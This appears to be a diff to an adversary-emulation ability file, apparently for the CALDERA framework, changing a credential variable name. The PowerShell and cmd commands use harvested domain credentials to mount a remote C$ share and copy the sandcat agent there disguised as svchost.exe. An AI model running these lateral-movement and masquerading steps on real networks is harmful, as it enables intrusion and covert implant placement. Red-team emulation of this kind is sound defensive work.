@@ -11,7 +11,7 @@
     windows:
       psh:
         command: |
-          $username = "#{comp.user.name}";
+          $username = "#{domain.user.name}";
           $password = "#{domain.user.password}";
           $secstr = New-Object -TypeName System.Security.SecureString;
           $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
@@ -27,7 +27,7 @@
           Remove-PSDrive -Name $drive;
       cmd:
         command: |
-          net use \\#{remote.host.ip}\c$ /user:#{comp.user.name} #{domain.user.password} /persistent:no &
+          net use \\#{remote.host.ip}\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &
           copy /B /Y sandcat.go-windows \\#{remote.host.ip}\c$\Users\Pubic\svchost.exe
         payload: sandcat.go-windows
         cleanup: |
